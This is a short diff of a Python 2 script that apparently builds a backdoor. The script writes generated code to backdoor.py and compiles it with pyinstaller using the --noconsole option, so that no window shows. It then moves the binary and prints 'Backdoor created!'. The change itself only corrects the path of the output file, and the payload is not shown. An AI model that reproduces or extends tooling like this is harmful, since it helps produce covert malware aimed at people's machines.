@@ -83,7 +83,7 @@ try:
     f.write (maket)
     f.close ()
     system ('pyinstaller --noconsole backdoor.py')
-    system ('mv dist/backdoor ./ && rm -R dist build')
+    system ('mv dist/backdoor/backdoor ./ && rm -R dist build')
     print Fore.CYAN + '[*] ' + Fore.RESET + ' Backdoor created!'
 except:
     print Fore.RED + '[!]' + Fore.RESET + ' Error!'
